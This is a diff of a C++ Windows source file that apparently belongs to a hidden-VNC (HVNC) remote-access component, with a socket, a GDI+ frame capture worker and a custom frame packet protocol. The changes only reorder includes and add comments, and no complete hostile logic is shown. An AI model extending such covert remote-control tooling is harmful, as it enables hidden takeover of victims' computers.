@@ -1,8 +1,9 @@
 #define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <windows.h>
-#include <gdiplus.h>
 #include <objbase.h>
+#include <propidl.h>
+#include <gdiplus.h>
 #include <vector>
 #include <string>
 #include <thread>
@@ -17,7 +18,8 @@ using json = nlohmann::json;
 using namespace Gdiplus;
 using namespace std;
 
-static const uint16_t PACKET_SIGNATURE = 0x524E;
+// Protocol constants
+static const uint16_t PACKET_SIGNATURE = 0x524E; // 'NR'
 static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
 static const uint32_t FRAME_FORMAT_JPEG = 1;
 
@@ -29,7 +31,7 @@ struct PacketHeader {
 };
 
 struct HVNCFrameHeader {
-    uint32_t monitor;
+    uint32_t monitor; // Used for cursor shape
     uint32_t scale;
     uint32_t fps;
     uint32_t width;
@@ -39,6 +41,7 @@ struct HVNCFrameHeader {
 };
 #pragma pack(pop)
 
+// Global state
 static atomic_bool g_running(false);
 static SOCKET g_socket = INVALID_SOCKET;
 static atomic<int> g_quality(50);
@@ -75,6 +78,7 @@ static LRESULT g_dragHT = HTCLIENT;
 static mutex g_gdiMutex;
 static ULONG_PTR g_gdiToken = 0;
 
+// Helpers
 static void send_raw(const void* data, int len) {
     if (g_socket == INVALID_SOCKET || !g_running) return;
     lock_guard<mutex> lock(g_sendMutex);
@@ -148,6 +152,7 @@ static int GetCursorIdx(HCURSOR h) {
     return 0;
 }
 
+// Workers
 static void frame_worker() {
     CoInitialize(NULL);
     if (!init_gdiplus()) { send_status("Error: GDI+ Failed"); return; }
